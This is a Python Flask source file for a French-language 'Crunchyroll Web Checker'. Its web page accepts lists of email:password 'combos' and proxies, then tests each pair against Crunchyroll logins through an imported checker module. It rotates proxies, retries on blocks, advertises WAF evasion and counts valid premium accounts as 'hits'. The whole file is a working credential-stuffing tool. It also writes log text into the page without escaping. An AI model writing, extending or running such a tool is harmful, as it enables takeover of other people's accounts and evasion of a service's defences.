from flask import Flask, render_template, request, jsonify
import threading
import uuid
from chk import CrunchyChecker

app = Flask(__name__)

# Stockage en mémoire des sessions de scan
scans = {}

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Crunchyroll Web Checker</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-slate-900 text-white font-sans min-h-screen">
        <div class="container mx-auto px-4 py-8">
            <header class="mb-10 text-center">
                <h1 class="text-4xl font-bold text-orange-500">Crunchyroll Web Checker</h1>
                <p class="text-slate-400 mt-2">Optimisé avec TLS-Client & Anti-WAF</p>
            </header>

            <div class="grid md:grid-cols-2 gap-8">
                <div class="bg-slate-800 p-6 rounded-xl shadow-xl border border-slate-700">
                    <h2 class="text-xl font-semibold mb-4">Configuration</h2>
                    <div class="space-y-4">
                        <div>
                            <label class="block text-sm font-medium mb-1">Combos (email:pass)</label>
                            <textarea id="combos" rows="5" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-sm focus:ring-2 focus:ring-orange-500 outline-none" placeholder="user@mail.com:password123"></textarea>
                        </div>
                        <div>
                            <label class="block text-sm font-medium mb-1">Proxies (un par ligne)</label>
                            <textarea id="proxies" rows="5" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-sm focus:ring-2 focus:ring-orange-500 outline-none" placeholder="ip:port ou user:pass@ip:port"></textarea>
                        </div>
                        <button onclick="startScan()" id="btnStart" class="w-full bg-orange-600 hover:bg-orange-500 text-white font-bold py-3 rounded-lg transition-colors">Lancer le Scan</button>
                    </div>
                </div>

                <div class="bg-slate-800 p-6 rounded-xl shadow-xl border border-slate-700">
                    <h2 class="text-xl font-semibold mb-4">Statistiques en Direct</h2>
                    <div class="grid grid-cols-2 gap-4 text-center">
                        <div class="bg-slate-900 p-4 rounded-lg border border-green-900/30">
                            <span class="block text-2xl font-bold text-green-500" id="stat-hits">0</span>
                            <span class="text-xs uppercase text-slate-500">Hits (Premium)</span>
                        </div>
                        <div class="bg-slate-900 p-4 rounded-lg border border-red-900/30">
                            <span class="block text-2xl font-bold text-red-500" id="stat-bad">0</span>
                            <span class="text-xs uppercase text-slate-500">Invalides</span>
                        </div>
                        <div class="bg-slate-900 p-4 rounded-lg border border-blue-900/30">
                            <span class="block text-2xl font-bold text-blue-400" id="stat-checked">0</span>
                            <span class="text-xs uppercase text-slate-500">Vérifiés</span>
                        </div>
                        <div class="bg-slate-900 p-4 rounded-lg border border-orange-900/30">
                            <span class="block text-2xl font-bold text-orange-400" id="stat-retries">0</span>
                            <span class="text-xs uppercase text-slate-500">Retries</span>
                        </div>
                    </div>
                    <div id="log" class="mt-6 h-48 overflow-y-auto bg-black rounded p-3 text-xs font-mono text-slate-300 space-y-1">
                        <div>En attente du lancement...</div>
                    </div>
                </div>
            </div>
        </div>

        <script>
            let scanId = null;
            let interval = null;

            async function startScan() {
                const combos = document.getElementById('combos').value.trim();
                const proxies = document.getElementById('proxies').value.trim();
                if(!combos) return alert("Veuillez entrer des combos");

                document.getElementById('btnStart').disabled = true;
                document.getElementById('btnStart').innerText = "Vérification en cours...";

                const res = await fetch('/api/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({combos: combos.split('\\n'), proxies: proxies ? proxies.split('\\n') : []})
                });
                
                const data = await res.json();
                scanId = data.scanId;
                interval = setInterval(updateStats, 2000);
            }

            async function updateStats() {
                if(!scanId) return;
                const res = await fetch(`/api/status/${scanId}`);
                const data = await res.json();
                
                document.getElementById('stat-hits').innerText = data.hits;
                document.getElementById('stat-bad').innerText = data.bad;
                document.getElementById('stat-checked').innerText = data.checked;
                document.getElementById('stat-retries').innerText = data.retries;

                const logDiv = document.getElementById('log');
                logDiv.innerHTML = data.logs.map(l => `<div>${l}</div>`).join('');
                logDiv.scrollTop = logDiv.scrollHeight;

                if(data.finished) {
                    clearInterval(interval);
                    document.getElementById('btnStart').disabled = false;
                    document.getElementById('btnStart').innerText = "Scan Terminé - Relancer";
                }
            }
        </script>
    </body>
    </html>
    """

@app.route('/api/start', methods=['POST'])
def start_checker():
    data = request.json
    scan_id = str(uuid.uuid4())
    combos = data.get('combos', [])
    proxies = data.get('proxies', [])
    
    scans[scan_id] = {
        'hits': 0, 'bad': 0, 'checked': 0, 'retries': 0, 
        'logs': [], 'finished': False
    }

    def run_worker():
        import random
        for line in combos:
            if ':' not in line: continue
            email, password = line.strip().split(':')
            
            success = False
            attempts = 0
            while not success and attempts < 3:
                proxy = random.choice(proxies) if proxies else None
                checker = CrunchyChecker(proxy)
                status, result = checker.get_token(email, password)
                
                if status == "SUCCESS":
                    scans[scan_id]['hits'] += 1
                    scans[scan_id]['logs'].append(f"🟢 HIT: {email}")
                    success = True
                elif status == "INVALID":
                    scans[scan_id]['bad'] += 1
                    scans[scan_id]['logs'].append(f"🔴 BAD: {email}")
                    success = True
                elif status in ["BANNED_PROXY", "TIMEOUT"]:
                    scans[scan_id]['retries'] += 1
                    attempts += 1
                    scans[scan_id]['logs'].append(f"🟡 RETRY: {email} (Proxy bloqué)")
                else:
                    attempts += 1
            
            scans[scan_id]['checked'] += 1
        scans[scan_id]['finished'] = True

    threading.Thread(target=run_worker).start()
    return jsonify({"scanId": scan_id})

@app.route('/api/status/<scan_id>')
def status(scan_id):
    return jsonify(scans.get(scan_id, {"error": "Not found"}))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
